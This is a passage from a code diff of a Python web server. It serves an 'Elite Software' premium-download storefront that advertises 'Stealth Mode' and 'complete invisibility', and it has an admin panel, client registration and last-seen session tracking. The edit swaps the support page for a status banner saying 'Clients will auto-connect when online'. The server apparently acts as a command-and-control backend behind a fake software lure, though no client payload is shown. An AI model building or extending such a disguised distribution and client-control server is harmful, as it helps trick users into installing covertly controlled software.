-                    <h3>🚀 Maximum Performance</h3>
-                    <p>Optimized for speed and efficiency</p>
-                </div>
-                
-                <div class="premium-card">
-                    <h3>🛡️ Stealth Mode</h3>
-                    <p>Complete invisibility and protection</p>
-                </div>
-                
-                <div class="premium-card">
-                    <h3>⚡ Instant Updates</h3>
-                    <p>Real-time feature updates</p>
-                </div>
-            </div>
-        </body>
-        </html>
-        '''
-        self.send_response(200)
-        self.send_header('Content-type', 'text/html')
-        self.end_headers()
-        self.wfile.write(html.encode())
-
-    def send_support_page(self):
-        html = '''
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <title>Support - Elite Software</title>
-            <style>
-                body { 
-                    font-family: 'Segoe UI', Arial, sans-serif; 
-                    background: linear-gradient(135deg, #111827 0%, #1F2937 100%);
-                    color: white; 
-                    margin: 0; 
-                    padding: 100px 5% 50px;
-                }
-            </style>
-        </head>
-        <body>
-            <nav class="navbar" style="position: fixed; top: 0; width: 100%; background: rgba(17,24,39,0.95); padding: 1rem 5%;">
-                <div class="logo">⚡ Elite Software</div>
-                <div class="nav-links">
-                    <a href="/">Home</a>
-                    <a href="/support" style="color: #8B5CF6;">Support</a>
-                    <a href="/downloads">Downloads</a>
-                </div>
-            </nav>
-
-            <h1>Customer Support</h1>
-            <p>Contact us for any assistance</p>
-            
-            <div style="margin-top: 2rem; padding: 2rem; background: rgba(255,255,255,0.1); border-radius: 15px;">
-                <h3>📞 Contact Information</h3>
-                <p>Email: support@elite-software.com</p>
-                <p>Telegram: @elitesoftware_support</p>
-                <p>Response Time: 24 hours</p>
+            <div style="background: #2a2a2a; padding: 20px; border-radius: 10px;">
+                <h3>System Status: 🟢 Active</h3>
+                <p>Clients will auto-connect when online</p>
             </div>
         </body>
         </html>
@@ -911,50 +639,13 @@ if __name__ == "__main__":
             print(f"New client: {client_id}")
             return {'success': True}
 
-def cleanup_sessions():
-    while True:
-        try:
-            current_time = datetime.now()
-            with PremiumSoftwareHandler.session_lock:
-                for client_id, client_data in list(PremiumSoftwareHandler.sessions.items()):
-                    last_seen = datetime.fromisoformat(client_data['last_seen'])
-                    if (current_time - last_seen).total_seconds() > 300:
-                        del PremiumSoftwareHandler.sessions[client_id]
-            time.sleep(60)
-        except:
-            pass
-
 def main():
     handler = PremiumSoftwareHandler
-    handler.init_database(handler)
-    
-    threading.Thread(target=cleanup_sessions, daemon=True).start()
-    
     port = int(os.environ.get('PORT', 8080))
     server = ThreadedHTTPServer(('0.0.0.0', port), handler)
     
-    print("=" * 70)
-    print("🚀 ELITE SOFTWARE - PREMIUM PLATFORM")
-    print("=" * 70)
-    print(f"📍 Main Site: {handler.SERVER_URL}")
-    print(f"🔐 Admin Panel: {handler.SERVER_URL}/admin")
-    print(f"📥 Downloads: {handler.SERVER_URL}/downloads")
-    print("💰 Premium: /premium")
-    print("🆘 Support: /support")
-    print("=" * 70)
-    print("✅ Server started successfully!")
-    print("⚡ Premium software system activated")
-    print("=" * 70)
-    
-    try:
-        server.serve_forever()
-    except KeyboardInterrupt:
-        print("Server stopped by user")
-    except Exception as e:
-        print(f"Server error: {e}")
-    finally:
-        if hasattr(handler, 'conn'):
-            handler.conn.close()
+    print("Server started at: https://game-python-1.onrender.com")
+    server.serve_forever()
 
 if __name__ == "__main__":
     main()
